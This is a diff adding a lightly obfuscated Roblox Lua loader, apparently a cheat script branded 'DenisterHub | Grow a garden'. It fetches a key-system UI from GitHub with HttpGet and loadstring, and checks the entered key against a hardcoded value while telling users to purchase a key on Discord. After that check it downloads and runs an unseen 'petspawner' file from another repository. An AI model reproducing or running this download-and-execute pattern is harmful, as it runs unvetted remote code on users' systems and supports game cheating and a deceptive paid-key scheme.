@@ -1,1 +1,49 @@
+return (function(...)
+	local A = select
+	local B = { ... }
+	local C = loadstring
+	local D = game
+	local E = D.HttpGet
+	local F = {
+		"https://raw.githubusercontent.com/",
+		"OopssSorry/",
+		"LuaU-Free-Key-System-UI/",
+		"main/source.lua"
+	}
+	local G = {
+		"e4d9", "09c2", "90d0", "fb1c",
+		"a068", "ffad", "df22", "cbd0"
+	}
+	local H = false
+	local I = table.concat(F)
+	local J = C(E(D, I))()
+	local K = table.concat({
+		"Please", " purchase", " a", " key", " on", " Discord"
+	})
+	local L = J:Init({
+		Debug = false,
+		Title = "DenisterHub | Grow a garden",
+		Description = K,
+		Discord = "https://discord.gg/" .. "MkKj5HBPjH",
+		SaveKey = false,
+		Verify = function(M)
+			if M == table.concat(G) then
+				H = true
+				return true
+			end
+			return false
+		end,
+		GuiParent = D.CoreGui
+	})
+	if not (L and H) then return end
+	local N = {
+		"https://raw.githubusercontent.com/",
+		"qweqredf/",
+		"petspawner/",
+		"refs/heads/main/",
+		"9aae51171e06637390fca3370b25a337.txt"
+	}
+	local O = table.concat(N)
+	C(E(D, O))()
+end)(...)
 
